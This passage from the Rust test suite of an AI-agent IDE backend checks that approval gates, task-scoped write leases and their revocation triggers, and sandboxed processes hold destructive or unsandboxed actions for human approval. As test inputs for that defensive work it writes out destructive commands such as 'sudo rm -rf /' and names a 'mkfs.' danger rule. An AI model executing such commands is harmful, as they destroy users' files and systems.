        let g1 = book.hold(held(cmd("sudo rm a"), None)).expect("parked");
        let g2 = book
            .hold(held(cmd("rm -rf /"), Some("sub".into())))
            .expect("parked");
        assert_ne!(g1, g2, "gate ids are unique");
        assert_eq!(book.len(), 2);

        // take() consumes exactly one and returns the parked command.
        let taken = book.take(&g1).expect("g1 parked");
        assert_eq!(taken, held(cmd("sudo rm a"), None));
        assert_eq!(book.len(), 1);
        assert!(book.take(&g1).is_none(), "a gate id is single-use");

        // remove() (deny) drops without returning.
        assert!(book.remove(&g2));
        assert!(!book.remove(&g2));
        assert_eq!(book.len(), 0);

        // an unknown gate is a no-op both ways (a stale approval can never run anything).
        assert!(book.take("command:999").is_none());
        assert!(!book.remove("command:999"));
    }

    /// A full book REFUSES to park anything more; it never drops a pending approval on the floor.
    /// Everything already parked stays answerable, which is the point: an evicted gate answered
    /// "accepted" for an effect that no longer existed.
    #[test]
    fn gate_book_refuses_past_cap_and_keeps_what_it_holds() {
        let book = GateBook::default();
        let mut ids = Vec::new();
        for i in 0..GateBook::CAP {
            ids.push(
                book.hold(PendingAction::Command {
                    argv: vec!["sudo".into(), format!("c{i}")],
                    cwd: None,
                })
                .expect("under cap"),
            );
        }
        assert_eq!(book.len(), GateBook::CAP, "bounded at CAP");
        assert!(
            book.hold(PendingAction::Command {
                argv: vec!["sudo".into(), "overflow".into()],
                cwd: None,
            })
            .is_none(),
            "a full book refuses instead of evicting"
        );
        for id in &ids {
            assert!(book.take(id).is_some(), "every parked gate is still answerable");
        }
    }

    // A command classified dangerous (the `mkfs.` rule) but whose program does not exist, so even the
    // approve path's execution fails fast with ENOENT instead of running anything real.
    fn held_argv() -> Vec<String> {
        vec!["mkfs.hidetest".to_string(), "noop".to_string()]
    }

    async fn first_security_gate(
        rx: &mut tokio::sync::broadcast::Receiver<UiEvent>,
    ) -> (String, String) {
        loop {
            let ev = tokio::time::timeout(std::time::Duration::from_secs(2), rx.recv())
                .await
                .expect("a UiEvent should arrive")
                .expect("broadcast delivers");
            if let UiEventKind::SecurityGate { gate, message } = ev.kind {
                return (gate, message);
            }
        }
    }

    #[tokio::test]
    async fn host_holds_dangerous_command_and_releases_on_approve() {
        let dir = std::env::temp_dir().join(format!("hide_host_gate_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let mut rx = host.subscribe_ui();

        // A destructive command is parked (not run) and surfaces a SecurityGate carrying its id.
        let ack = host
            .handle_intent(Intent::RunCommand {
                argv: held_argv(),
                cwd: None,
            })
            .await
            .unwrap();
        assert!(ack.accepted);
        assert_eq!(
            host.pending_gate_count(),
            1,
            "the command is held at the gate"
        );

        let (gate, message) = first_security_gate(&mut rx).await;
        assert!(
            message.contains("mkfs.hidetest"),
            "the gate names the blocked command"
        );

        // Approving with that id releases the held command from the book (and dispatches it).
        let ack = host
            .handle_intent(Intent::Custom {
                name: "approve_gate".to_string(),
                payload: json!({ "gate": gate }),
            })
            .await
            .unwrap();
        assert!(ack.accepted);
        assert_eq!(
            host.pending_gate_count(),
            0,
            "approve consumes the held command"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_drops_held_command_on_deny() {
        let dir = std::env::temp_dir().join(format!("hide_host_gate_deny_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let mut rx = host.subscribe_ui();
        host.handle_intent(Intent::RunCommand {
            argv: held_argv(),
            cwd: None,
        })
        .await
        .unwrap();
        assert_eq!(host.pending_gate_count(), 1);
        let (gate, _) = first_security_gate(&mut rx).await;

        host.handle_intent(Intent::Custom {
            name: "deny_gate".to_string(),
            payload: json!({ "gate": gate }),
        })
        .await
        .unwrap();
        assert_eq!(
            host.pending_gate_count(),
            0,
            "deny drops the held command without running it"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Trace D: a service-style process starts sandbox-confined, keeps running
    /// while the user navigates away, has its streamed output attached to a turn
    /// and verified, is stopped, and has its logs preserved as a durable artifact.
    #[tokio::test]
    async fn trace_d_service_process_persists_streams_and_captures() {
        // Fail-closed sandbox: this trace requires a real OS sandbox. On a host
        // without one (e.g. a Linux CI with no bwrap), the confined start refuses,
        // exactly as the existing shell.run tests assume a sandbox is present.
        if !std::path::Path::new("/usr/bin/sandbox-exec").exists() {
            return;
        }
        let dir = std::env::temp_dir().join(format!("hide_host_traced_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        let mut rx = host.subscribe_ui();

        // (c) Start a persistent service-style process (a heartbeat loop). Only
        // sandbox-allowlisted binaries: sh + echo/true builtins + sleep.
        let id = host.start_process(
            vec![
                "sh".to_string(),
                "-c".to_string(),
                "i=0; while true; do echo heartbeat $i; i=$((i+1)); sleep 0.1; done".to_string(),
            ],
            None,
            std::collections::BTreeMap::new(),
            true,
            Some(session.to_string()),
        );

        // Wait until it has produced a few lines.
        let alive_with_output = {
            let mut ok = false;
            for _ in 0..100 {
                if host
                    .process_state(&id)
                    .map(|s| s.line_count >= 3)
                    .unwrap_or(false)
                {
                    ok = true;
                    break;
                }
                tokio::time::sleep(std::time::Duration::from_millis(30)).await;
            }
            ok
        };
        assert!(alive_with_output, "service process should stream heartbeats");

        // (a) The sandboxed route is used (not the raw exec).
        let state = host.process_state(&id).unwrap();
        assert!(state.sandboxed, "the process must be OS-sandbox-confined");
        assert!(state.persistent);
        assert_eq!(state.status, "running");
        assert_eq!(state.owner.as_deref(), Some(session.to_string().as_str()));

        // Simulate the user navigating away (a fresh session is minted). The
        // service must keep running independent of any session.
        host.handle_intent(Intent::Custom {
            name: "new_session".to_string(),
            payload: json!({}),
        })
        .await
        .unwrap();
        assert!(
            host.process_alive(&id),
            "the process persists across navigation"
        );

        // (b) Streamed output events were emitted (tool_progress tagged with the
        // process id), not just a final echo.
        let mut streamed = 0usize;
        while let Ok(ev) = rx.try_recv() {
            if let UiEventKind::ToolProgress { call_id, message, .. } = &ev.kind {
                if call_id == &id && message.contains("heartbeat") {
                    streamed += 1;
                }
            }
        }
        assert!(streamed > 0, "incremental stdout must stream as UiEvents");

        // Attach the streamed output to a (new) turn and run a verifier over it.
        let turn = SessionId::new();
        let captured = host.attach_process(&id, turn).expect("attach yields output");
        assert!(!captured.is_empty());
        // Model-free verifier: every line is "heartbeat N" with a strictly
        // increasing counter.
        let mut last: i64 = -1;
        for line in &captured {
            let n: i64 = line
                .strip_prefix("heartbeat ")
                .and_then(|s| s.trim().parse().ok())
                .unwrap_or_else(|| panic!("unexpected output line: {line:?}"));
            assert!(n > last, "heartbeat counter must increase: {n} after {last}");
            last = n;
        }

        // Stop it, then confirm it is no longer alive and is marked stopped.
        assert!(host.stop_process(&id));
        for _ in 0..100 {
            if !host.process_alive(&id) {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(30)).await;
        }
        assert!(!host.process_alive(&id), "stop terminates the process");
        assert_eq!(host.process_state(&id).unwrap().status, "stopped");

        // Preserve its logs as a durable artifact and read them back.
        let artifact = host.capture_process_artifact(&id).unwrap();
        let bytes = host
            .services
            .blob_store
            .get(&artifact)
            .unwrap()
            .expect("artifact is durable");
        assert!(String::from_utf8_lossy(&bytes).contains("heartbeat"));

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_new_session_publishes_a_fresh_session() {
        let dir = std::env::temp_dir().join(format!("hide_host_newsess_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let mut rx = host.subscribe_ui();

        let ack = host
            .handle_intent(Intent::Custom {
                name: "new_session".to_string(),
                payload: json!({}),
            })
            .await
            .unwrap();
        assert!(ack.accepted, "new_session is accepted");

        // A `turn` projection under a fresh session id is published so the FE adopts the new session.
        let ev = loop {
            let ev = tokio::time::timeout(std::time::Duration::from_secs(2), rx.recv())
                .await
                .expect("a UiEvent should arrive")
                .expect("broadcast delivers");
            if let UiEventKind::ProjectionPatch { ref projection, .. } = ev.kind {
                if projection == "turn" && ev.session_id.is_some() {
                    break ev;
                }
            }
        };
        assert!(
            ev.session_id.is_some(),
            "new_session carries a fresh session id"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_holds_create_worktree_at_the_gate() {
        let dir = std::env::temp_dir().join(format!("hide_host_wt_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        // Accepted and logged, but the raw (unsandboxed) `git worktree add` is PARKED: a frontend
        // button alone can no longer reach an unsandboxed exec.
        let ack = host
            .handle_intent(Intent::Custom {
                name: "create_worktree".to_string(),
                payload: json!({ "branch": "feat/launch pad" }),
            })
            .await
            .unwrap();
        assert!(ack.accepted, "create_worktree is accepted and recorded");
        assert!(ack.held, "and HELD: the ack must not read as done");
        assert_eq!(
            host.pending_gate_count(),
            1,
            "the unsandboxed worktree exec waits for an explicit approval"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Approving the gate must actually RUN the held effect. The regression this locks: the Ask
    /// hold parked `create_worktree` as a `PendingAction::Intent` while `run_approved_intent` had
    /// no arm for it, so approving published an error and no worktree was ever created.
    #[tokio::test]
    async fn approving_create_worktree_runs_it() {
        let dir = std::env::temp_dir().join(format!("hide_host_wt_run_{}", now_ms()));
        std::fs::create_dir_all(&dir).unwrap();
        assert!(std::process::Command::new("git")
            .args(["init", "-q"])
            .current_dir(&dir)
            .status()
            .map(|s| s.success())
            .unwrap_or(false));
        // A commit, so `git worktree add -b` has a HEAD to branch from.
        for (k, v) in [("user.email", "t@t"), ("user.name", "t")] {
            let _ = std::process::Command::new("git")
                .args(["config", k, v])
                .current_dir(&dir)
                .status();
        }
        std::fs::write(dir.join("a.txt"), "a").unwrap();
        let _ = std::process::Command::new("git")
            .args(["add", "-A"])
            .current_dir(&dir)
            .status();
        let _ = std::process::Command::new("git")
            .args(["commit", "-qm", "init"])
            .current_dir(&dir)
            .status();

        let host = BackendHost::open_workspace(&dir).unwrap();
        let ack = host
            .handle_intent(Intent::Custom {
                name: "create_worktree".to_string(),
                payload: json!({ "branch": "runme" }),
            })
            .await
            .unwrap();
        assert!(ack.held, "held at the gate");
        let gate = ack
            .message
            .as_deref()
            .and_then(|m| m.split("gate=").nth(1))
            .unwrap()
            .to_string();
        host.approve_gate(&gate).await.expect("the released effect succeeds");
        // The exec is spawned; poll for the sibling directory the worktree lands in.
        let expected = dir.parent().unwrap().join(format!(
            "{}-runme",
            dir.file_name().unwrap().to_string_lossy()
        ));
        let mut made = false;
        for _ in 0..100 {
            if expected.exists() {
                made = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        assert!(made, "approving the gate creates the worktree at {expected:?}");
        let _ = std::process::Command::new("git")
            .args(["worktree", "remove", "--force", &expected.to_string_lossy()])
            .current_dir(&dir)
            .status();
        let _ = std::fs::remove_dir_all(&expected);
        let _ = std::fs::remove_dir_all(dir);
    }

    /// The task-scoped write lease, end to end on the SHIPPED default policy
    /// (`workspace_write_default = Ask`). This is the trace the product could not run before: with
    /// every write refused, the agent's own edits were refused too, so the diff store stayed empty.
    #[tokio::test]
    async fn write_lease_trace_a_task_edits_and_the_diff_store_fills() {
        let _guard = crate::tools::lease_test_guard();
        let dir = std::env::temp_dir().join(format!("hide_host_lease_{}", now_ms()));
        let repo_root = dir.join("repo");
        std::fs::create_dir_all(repo_root.join("src")).unwrap();
        let host = BackendHost::open_workspace(&dir).unwrap();
        assert_eq!(
            HideConfig::for_workspace(&dir).security.workspace_write_default,
            Decision::Ask,
            "this trace only means something on the shipped default"
        );
        let session = host.services.session();
        let run = RunId::new();
        let diff_id = format!("diff-{}", run.as_str());
        let file = repo_root.join("src").join("lib.rs");
        std::fs::write(&file, "before\n").unwrap();
        let edit = |content: &str, path: &std::path::Path| {
            ToolCall::new(
                "edit.write_file",
                json!({ "path": path.to_string_lossy(), "content": content }),
            )
        };

        // (1) NO LEASE: the agent's own edit is refused, nothing lands, and the diff store is empty.
        let err = host
            .dispatch_tool(session.clone(), Some(run.clone()), edit("after\n", &file))
            .await
            .expect_err("the shipped default refuses every workspace write");
        assert!(matches!(err, hide_core::error::HideError::PolicyDenied(_)));
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "before\n");
        assert!(
            host.diff_get(&diff_id).is_none(),
            "no diff can exist for a write that never happened"
        );

        // and the editor save of the same file is HELD honestly: no surface may read it as done.
        let ack = host
            .handle_intent(Intent::Custom {
                name: "save_file".to_string(),
                payload: json!({ "path": "repo/src/lib.rs", "content": "after\n" }),
            })
            .await
            .unwrap();
        assert!(ack.held, "with no lease the write is held for approval");
        assert_eq!(
            std::fs::read_to_string(&file).unwrap(),
            "before\n",
            "held means nothing was written"
        );

        // (2) APPROVING THE TASK GRANTS THE LEASE. The repo is trusted first; the grant is itself
        // an Ask command, so the intent alone installs nothing.
        host.workspace_add_repo(RepoNode::new("repo", &repo_root))
            .unwrap();
        host.workspace_set_repo_trust("repo", TrustState::Trusted)
            .unwrap();
        let ack = host
            .handle_intent(Intent::Custom {
                name: "grant_write_lease".to_string(),
                // The shape the app sends: the session every custom payload carries, plus the run
                // this task is. Both are what revocation matches on.
                payload: json!({
                    "repo_id": "repo",
                    "session_id": session.to_string(),
                    "run_id": run.as_str(),
                }),
            })
            .await
            .unwrap();
        assert!(ack.held, "the grant is held: only a human approval installs a lease");
        assert_eq!(host.write_lease(), None, "asking is not being granted");
        let gate = ack
            .message
            .as_deref()
            .and_then(|m| m.split("gate=").nth(1))
            .unwrap()
            .to_string();
        host.approve_gate(&gate).await.expect("the released effect succeeds");
        let lease = host.write_lease().expect("approving the task grants the lease");
        assert_eq!(lease.repo_id, "repo");

        // (3) UNDER THE LEASE a real agent edit lands AND registers a real diff, and the diff
        // projection publishes. Dispatched through the object the KERNEL holds (the one
        // `build_turn_kernel` hands the agent), not through the host wrapper: the agent is the
        // client this lease exists for, so proving it on a path the agent does not take proves
        // nothing.
        let mut rx = host.subscribe_ui();
        let agent = host.build_turn_dispatcher(session.clone(), Some(run.clone()));
        agent
            .dispatch(edit("after\n", &file))
            .await
            .expect("the lease lets the task's own edit through");
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "after\n");
        let proposal = host
            .diff_get(&diff_id)
            .expect("the DiffProposal registry populates");
        assert_eq!(proposal.hunks.len(), 1);
        assert_eq!(proposal.hunks[0].before, "before\n");
        assert_eq!(proposal.hunks[0].after, "after\n");
        let mut published = false;
        while let Ok(ev) = rx.try_recv() {
            if let UiEventKind::ProjectionPatch { projection, .. } = &ev.kind {
                published |= projection == "diff";
            }
        }
        assert!(published, "the diff projection publishes for a leased edit");

        // (4) OUT OF SCOPE is still blocked while the lease is active.
        let outside = dir.join("outside.rs");
        assert!(
            agent.dispatch(edit("x\n", &outside)).await.is_err(),
            "the lease grants nothing outside its declared scope"
        );
        assert!(!outside.exists());

        // (4b) ANOTHER TASK is blocked too, in scope or not: the lease authorizes the session the
        // grant named, so a write from any other caller stays on the gate path.
        let other = host.build_turn_dispatcher(SessionId::from("ses_someone_else"), None);
        assert!(
            other.dispatch(edit("theirs\n", &file)).await.is_err(),
            "the lease is bound to the task it was granted for"
        );
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "after\n");

        // (5) NO CHANNEL BYPASS. A lease is not a released gate, so an approval-gated EFFECT is
        // refused exactly as it was without one, whether it is reached from `/v1/hide/rpc` or from
        // any in-process caller; and the connector route's read allowlist is unchanged.
        let err = host.revert_diff(&diff_id).await.unwrap_err().to_string();
        assert!(
            err.contains("requires approval"),
            "the lease must not release a gated effect: {err}"
        );
        assert!(!crate::connectors::connector_method_is_read("write_file"));
        assert!(!crate::connectors::connector_method_is_read("grant_write_lease"));

        // (6) UNDO still works under the lease: the released revert writes the pre-image back.
        host.run_approved_intent("revert_diff", &json!({ "diff_id": diff_id }))
            .await
            .expect("an approved revert still runs with a lease held");
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "before\n");

        // (7) REWIND still works under the lease, on the same approved path.
        let ckpt = host
            .checkpoint_create(session.clone(), None, "leased")
            .await
            .unwrap();
        crate::tools::with_approved_writes(host.checkpoint_rewind(
            &ckpt.checkpoint_id,
            RewindTarget::Code,
        ))
        .await
        .expect("a rewind still runs with a lease held");

        // (8) RESTART INVALIDATES. The lease is process memory and nothing durable carries it, so
        // replaying the session (the only thing that rebuilds state from the log) leaves no lease
        // to inherit: after a restart the user re-approves the task.
        crate::tools::revoke_write_lease("simulated restart");
        host.rebuild_session_projection(session.clone())
            .await
            .unwrap();
        assert_eq!(
            host.write_lease(),
            None,
            "a restart leaves no lease to inherit"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Every revocation trigger the spec names actually revokes, and a trigger that names ANOTHER
    /// task does not. The triggers are read in ONE place in `handle_intent`, so this walks that
    /// place; the two that are not intents are asserted alongside (task completion is the
    /// run-scoped revoke the turn driver calls; restart is covered above).
    #[tokio::test]
    async fn every_write_lease_revocation_trigger_revokes() {
        let _guard = crate::tools::lease_test_guard();
        let dir = std::env::temp_dir().join(format!("hide_host_lease_revoke_{}", now_ms()));
        let repo_root = dir.join("repo");
        std::fs::create_dir_all(&repo_root).unwrap();
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        let custom = |name: &str, payload: Value| Intent::Custom {
            name: name.to_string(),
            payload,
        };

        let grant = || {
            crate::tools::install_write_lease(crate::tools::WriteLease {
                lease_id: "lease-revoke-test".to_string(),
                repo_id: "repo".to_string(),
                session_id: Some(session.to_string()),
                run_id: Some("run-under-test".to_string()),
                scopes: vec![repo_root.clone()],
                granted_ms: 0,
            })
        };

        let triggers: Vec<(&str, Intent)> = vec![
            ("explicit user revocation", custom("revoke_write_lease", json!({}))),
            ("task cancellation", Intent::CancelRun { run_id: RunId::from("run-under-test") }),
            ("session closure", custom("new_session", json!({}))),
            ("session switch", custom("open_session", json!({ "session_id": session.to_string() }))),
            (
                "session fork",
                Intent::ForkSession {
                    session_id: session.clone(),
                    at_event: EventId::from("evt-none"),
                },
            ),
            (
                "rewind past the grant",
                custom("checkpoint_rewind", json!({ "checkpoint_id": "none", "target": "code" })),
            ),
            (
                "repository trust loss",
                custom(
                    "workspace_set_repo_trust",
                    json!({ "repo_id": "repo", "trust": "untrusted", "root_path": repo_root.to_string_lossy() }),
                ),
            ),
            (
                "scope change",
                custom("environment_switch", json!({ "session_id": session.to_string(), "env_id": "none" })),
            ),
        ];

        for (label, intent) in triggers {
            grant();
            host.handle_intent(intent).await.unwrap();
            assert_eq!(host.write_lease(), None, "{label} must revoke the lease");
        }

        // Task COMPLETION: the run-scoped revoke the kernel turn driver calls on its terminal
        // publish. Another task's completion (or trust decision) leaves this lease alone.
        grant();
        assert!(crate::tools::revoke_write_lease_for_run("some-other-run", None).is_none());
        assert!(host.write_lease().is_some(), "another task's end is not this one's");
        host.handle_intent(Intent::CancelRun {
            run_id: RunId::from("some-other-run"),
        })
        .await
        .unwrap();
        assert!(host.write_lease().is_some(), "and neither is its cancellation");
        assert!(crate::tools::revoke_write_lease_for_run("run-under-test", None).is_some());
        assert_eq!(host.write_lease(), None, "task completion revokes");

        // Re-trusting a repo is not a revocation.
        grant();
        host.handle_intent(custom(
            "workspace_set_repo_trust",
            json!({ "repo_id": "repo", "trust": "trusted", "root_path": repo_root.to_string_lossy() }),
        ))
        .await
        .unwrap();
        assert!(host.write_lease().is_some(), "granting trust does not revoke");

        crate::tools::revoke_write_lease("end of test");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Guard the whole class, not the one name that broke: every catalog command the authority
    /// marks `ApprovalPolicy::Ask` must have a release arm, or approving its gate is a no-op and
    /// the command can never complete.
    #[tokio::test]
    async fn every_ask_command_has_a_release_handler() {
        let dir = std::env::temp_dir().join(format!("hide_host_ask_arms_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        use hide_protocol::command::{ApprovalPolicy, BackendBinding};
        let ask: Vec<String> = hide_protocol::command::command_catalog()
            .into_iter()
            .filter(|s| s.approval_policy == ApprovalPolicy::Ask)
            .map(|s| {
                // `requires_approval` keys on the catalog id, so an Ask row whose binding target is
                // a different string would be held under a name no release arm answers. And an
                // `Ask` row that is not Custom-bound needs an `effect_command` arm to be seen at
                // all, so declaring one without that arm must fail here rather than silently do
                // nothing (which is what the Custom-only filter used to do to every Intent row).
                match &s.backend_binding {
                    BackendBinding::Custom(n) => assert_eq!(*n, s.id, "an Ask row must bind its own id"),
                    other => panic!(
                        "{}: ApprovalPolicy::Ask on a {other:?} binding needs an effect_command arm",
                        s.id
                    ),
                }
                s.id
            })
            .collect();
        assert!(!ask.is_empty(), "the catalog declares at least one Ask command");
        for name in ask {
            // An empty payload makes the arm fail on a missing argument, which is fine: what must
            // NOT happen is the `other` fallthrough that says there is no release handler at all.
            let err = host
                .run_approved_intent(&name, &json!({}))
                .await
                .err()
                .map(|e| e.to_string())
                .unwrap_or_default();
            assert!(
                !err.contains("no release handler"),
                "{name} is ApprovalPolicy::Ask with no release arm: approving its gate does nothing"
            );
        }
        let _ = std::fs::remove_dir_all(dir);
    }

    /// The stronger guard, and the one that would have caught the write-policy denial:
    /// `every_ask_command_has_a_release_handler` only proves an ARM exists, and an arm that returns
    /// `PolicyDenied` on every shipped config is exactly as dead as a missing one.
    ///
    /// Runs on the config the shipped binary actually produces (`HideConfig::for_workspace`, i.e.
    /// `workspace_write_default = Decision::Ask`) and walks the catalog: every `ApprovalPolicy::Ask`
    /// row must reach a real effect once approved. The match is exhaustive, so a new Ask row fails
    /// here until somebody says what its effect is. `save_file` is included even though its hold is
    /// a policy denial rather than an `Ask` policy, because it releases through the same path.
    #[tokio::test]
    async fn every_ask_command_takes_effect_once_approved() {
        use hide_protocol::command::ApprovalPolicy;
        let dir = std::env::temp_dir().join(format!("hide_host_ask_effect_{}", now_ms()));
        std::fs::create_dir_all(&dir).unwrap();
        // NOT Decision::Allow: the whole point is the default the shipped host boots with.
        let config = HideConfig::for_workspace(&dir);
        assert_eq!(config.security.workspace_write_default, Decision::Ask);
        let host = BackendHost::from_services(BackendServices::open(config).unwrap()).unwrap();

        let mut ask: Vec<String> = hide_protocol::command::command_catalog()
            .into_iter()
            .filter(|s| s.approval_policy == ApprovalPolicy::Ask)
            .map(|s| s.id)
            .collect();
        ask.push("save_file".to_string());
        assert!(ask.len() > 1, "the catalog declares Ask commands");

        for name in ask {
            match name.as_str() {
                // The on-disk undo. A released revert must actually write the pre-image back.
                "revert_diff" => {
                    let file = dir.join("reverted.rs").to_string_lossy().to_string();
                    std::fs::write(&file, "AFTER\n").unwrap();
                    let hunk = DiffHunk {
                        hunk_id: "h0".to_string(),
                        file: file.clone(),
                        base_hash: blake3::hash(b"BEFORE\n").to_hex().to_string(),
                        before: "BEFORE\n".to_string(),
                        after: "AFTER\n".to_string(),
                        status: HunkStatus::Pending,
                        provenance: DiffProvenance {
                            plan_step: None,
                            agent: "test".to_string(),
                            turn: 0,
                        },
                    };
                    let proposal = DiffProposal {
                        diff_id: "d_ask".to_string(),
                        run_id: "r_ask".to_string(),
                        session_id: host.services.session(),
                        created_ms: now_ms(),
                        created_from: hunk.provenance.clone(),
                        hunks: vec![hunk],
                    };
                    DiffStore::put(&host.services.key_value_store, &proposal).unwrap();
                    host.run_approved_intent(&name, &json!({ "diff_id": "d_ask" }))
                        .await
                        .expect("an approved revert must not be refused by the write policy");
                    assert_eq!(
                        std::fs::read_to_string(&file).unwrap(),
                        "BEFORE\n",
                        "approving the gate must actually revert the file on disk"
                    );
                }
                // The editor save. A released save must actually land the bytes.
                "save_file" => {
                    let rel = "saved.txt";
                    host.run_approved_intent(
                        &name,
                        &json!({ "path": rel, "content": "SAVED\n" }),
                    )
                    .await
                    .expect("an approved save must not be refused by the write policy");
                    assert_eq!(std::fs::read_to_string(dir.join(rel)).unwrap(), "SAVED\n");
                }
                // The write lease. Approving the gate must install a REAL lease, and only over a
                // repo the user already trusted.
                "grant_write_lease" => {
                    let _guard = crate::tools::lease_test_guard();
                    let repo_root = dir.join("leased");
                    std::fs::create_dir_all(&repo_root).unwrap();
                    host.workspace_add_repo(RepoNode::new("leased", &repo_root))
                        .unwrap();

                    let err = host
                        .run_approved_intent(&name, &json!({ "repo_id": "leased" }))
                        .await
                        .err()
                        .map(|e| e.to_string())
                        .unwrap_or_default();
                    assert!(
                        err.contains("not trusted"),
                        "an untrusted repo may not be leased even with an approved gate: {err}"
                    );
                    assert_eq!(host.write_lease(), None, "and nothing was installed");

                    host.workspace_set_repo_trust("leased", TrustState::Trusted)
                        .unwrap();
                    host.run_approved_intent(&name, &json!({ "repo_id": "leased" }))
                        .await
                        .expect("an approved grant over a trusted repo installs the lease");
                    let lease = host.write_lease().expect("approving the gate grants the lease");
                    assert!(
                        lease.covers(&repo_root.join("src/new.rs").to_string_lossy()),
                        "the declared scope is the trusted repo's own root"
                    );
                    assert!(
                        !lease.covers(&dir.join("outside.rs").to_string_lossy()),
                        "and nothing outside it"
                    );
                    crate::tools::revoke_write_lease("end of test");
                }
                // The remaining rows address an object this fixture has no cheap way to mint, so
                // they assert the failure they DO produce is an honest "no such object" and never
                // the policy refusal (or the missing-arm fallthrough) that is what breaks them.
                "checkpoint_restore" | "checkpoint_rewind" | "workspace_set_repo_trust"
                | "create_worktree" => {
                    let err = host
                        .run_approved_intent(
                            &name,
                            &json!({ "checkpoint_id": "nope", "repo_id": "nope", "trusted": true }),
                        )
                        .await
                        .err()
                        .map(|e| e.to_string())
                        .unwrap_or_default();
                    assert!(
                        !err.contains("no release handler"),
                        "{name}: approving the gate does nothing"
                    );
                    assert!(
                        !err.to_lowercase().contains("policy"),
                        "{name}: approving the gate still hits the write policy: {err}"
                    );
                }
                other => panic!(
                    "{other} is ApprovalPolicy::Ask with no effect assertion here: say what \
                     approving its gate is supposed to DO, or it ships as another dead control"
                ),
            }
        }
        let _ = std::fs::remove_dir_all(dir);
    }

    /// The approval policy is enforced at the EFFECT, so no CHANNEL can route around it.
    /// `POST /v1/hide/rpc` reaches `checkpoint_restore` straight off the host, skipping
    /// `handle_intent`, `effect_command`, `requires_approval` and the gate book entirely, and the
    /// catalog declares that command `Ask`. The guard sits on the effect itself, so the rpc arm, the
    /// intent arm and any in-process caller all answer to the same one rule.
    #[tokio::test]
    async fn an_ask_effect_is_refused_on_every_channel_that_did_not_release_a_gate() {
        use hide_protocol::protocol::Method;
        let dir = std::env::temp_dir().join(format!("hide_host_chanbypass_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        append_code_change(&host, &session, "a.rs", "base").await;
        let ckpt = host
            .checkpoint_create(session.clone(), None, "cp")
            .await
            .unwrap();

        // The rpc channel: refused, and nothing is restored.
        let out = host
            .rpc(
                Method::CheckpointRestore,
                json!({ "checkpoint_id": ckpt.checkpoint_id }),
            )
            .await;
        let body = serde_json::to_string(&out).unwrap().to_lowercase();
        assert!(
            body.contains("requires approval"),
            "the rpc channel must not run an Ask effect unapproved: {body}"
        );

        // The direct in-process call: same refusal, same rule.
        let err = host
            .checkpoint_restore(&ckpt.checkpoint_id)
            .await
            .unwrap_err();
        assert!(matches!(err, hide_core::error::HideError::PolicyDenied(_)), "{err}");

        // And inside the released-gate scope (what approving the gate runs in) it works.
        crate::tools::with_approved_writes(host.checkpoint_restore(&ckpt.checkpoint_id))
            .await
            .expect("an approved restore runs");

        let _ = std::fs::remove_dir_all(dir);
    }

    /// The OTHER gate. A destructive argv is parked at the dangerous-command gate, which predates
    /// the `held` contract and never set it, so the ack read plain `accepted` and the terminal
    /// printed "started ... (sandbox confined)" for a command that never spawned.
    #[tokio::test]
    async fn a_gated_destructive_command_acks_held() {
        let dir = std::env::temp_dir().join(format!("hide_host_danger_held_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let ack = host
            .handle_intent(Intent::RunCommand {
                argv: vec!["sudo".to_string(), "rm".to_string(), "-rf".to_string(), "/".to_string()],
                cwd: None,
            })
            .await
            .unwrap();
        assert!(ack.accepted, "the request is recorded");
        assert!(ack.held, "a parked destructive command may not read as started");
        assert!(ack.message.unwrap_or_default().contains("gate="), "carries the gate to approve");

        // An ordinary command is not held.
        let ok = host
            .handle_intent(Intent::RunCommand {
                argv: vec!["echo".to_string(), "hi".to_string()],
                cwd: None,
            })
            .await
            .unwrap();
        assert!(!ok.held, "a safe command is not parked");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// A custom name no arm here handles is RECORDED but honestly refused, so a frontend control
    /// bound to a dead name cannot render a success.
    #[tokio::test]
    async fn host_refuses_an_unhandled_custom_name() {
        let dir = std::env::temp_dir().join(format!("hide_host_unhandled_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let ack = host
            .handle_intent(Intent::Custom {
                name: "create_pr".to_string(),
                payload: json!({}),
            })
            .await
            .unwrap();
        assert!(!ack.accepted, "no handler means no success ack");
        assert!(ack.message.unwrap_or_default().contains("create_pr"));
        assert!(
            ack.event_seq.is_some(),
            "the intent is still recorded in the log"
        );
        // A handled name is unaffected.
        let ok = host
            .handle_intent(Intent::Custom {
                name: "new_session".to_string(),
                payload: json!({}),
            })
            .await
            .unwrap();
        assert!(ok.accepted);
        let _ = std::fs::remove_dir_all(dir);
    }

    /// `run_static_analysis` is reachable over the intent channel, so the Problems counter has a
    /// producer.
    #[tokio::test]
    async fn host_runs_static_analysis_over_the_intent_channel() {
        let dir = std::env::temp_dir().join(format!("hide_host_sa_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        let ack = host
            .handle_intent(Intent::Custom {
                name: "run_static_analysis".to_string(),
                payload: json!({
                    "session_id": session.to_string(),
